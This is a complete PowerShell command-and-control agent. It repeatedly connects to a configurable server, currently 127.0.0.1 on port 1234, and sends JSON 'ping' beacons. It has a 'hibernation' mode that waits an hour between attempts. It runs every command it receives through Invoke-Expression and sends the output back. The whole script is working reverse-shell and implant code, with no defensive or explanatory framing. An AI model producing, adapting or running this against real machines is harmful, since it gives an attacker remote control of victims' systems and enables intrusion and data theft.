# Config
$serverIP = "127.0.0.1"
$serverPort = 1234
$sleeptime = 60
$hibernationTime = 3600
$mode = 0 # 0 = normal, 1 = Hibernation


# Function allowing to connect to the server
function Connect-ToServer {
    while ($true) {
        try {
            # Create a TCP client
            $global:client = [System.Net.Sockets.TcpClient]::new($serverIP, $serverPort)
            $global:networkStream = $client.GetStream()
            $global:reader = [System.IO.StreamReader]::new($networkStream)
            $global:writer = [System.IO.StreamWriter]::new($networkStream)
            Write-Host "Connected to server $serverIP on port $serverPort"
            return
        }
        catch {
            if ($mode -eq 1) {
                Write-Host "Entering hibernation mode... Retrying in $hibernationTime seconds..."
                Start-Sleep -Seconds $hibernationTime
            } else {
                Write-Host "Failed to connect to server. Retrying in $sleeptime seconds..."
                Start-Sleep -Seconds $sleeptime
            }
        }
    }
}

# Function to test connection to the server to update clinet.connected status
# As per Microsoft documentation, the Connected property is not updated until you call the GetStream method
# https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.connected?view=net-8.0

function Test-Connection {
    try {
        $message = Format-Message -message "ping"
        $writer.WriteLine($message)
        $writer.Flush()
    }
    catch {
        Write-Host "An error occurred: $($_.Exception.Message)"
    }
}

# Format message
function Format-Message {
    param (
        [string]$message
    )
    
    # Convert the string to a PowerShell object
    $messageObject = [PSCustomObject]@{ message = $message }

    # Add the 'mode' property
    $messageObject | Add-Member -MemberType NoteProperty -Name mode -Value $mode

    # Convert the object to JSON
    $json = $messageObject | ConvertTo-Json
    
    return $json
}

# Function to handle incoming commands
function Handle-Commands {
    while ($true) {
        Test-Connection
        if ($client.Connected) {
            if ($networkStream.DataAvailable) {
                $command = $reader.ReadLine()
                $output = Invoke-Expression $command
                $formatted = Format-Message -message $output
                $writer.WriteLine($formatted)
                $writer.Flush()
                $client.Close()
            }
            if ($mode -eq 1) {
                Write-Host "Entering hibernation mode... Retrying in $hibernationTime seconds..."
                Start-Sleep -Seconds $hibernationTime
            } else {
                Write-Host "No data available. Retrying in $sleeptime seconds..."
                Start-Sleep -Seconds $sleeptime
            }
        }
        else {
            Write-Host "Disconnected from server. Attempting to reconnect..."
            Connect-ToServer
        }
    }
}

# Start handling commands
Connect-ToServer
Handle-Commands


# Cleanup
$reader.Close()
$writer.Close()
$networkStream.Close()
$client.Close()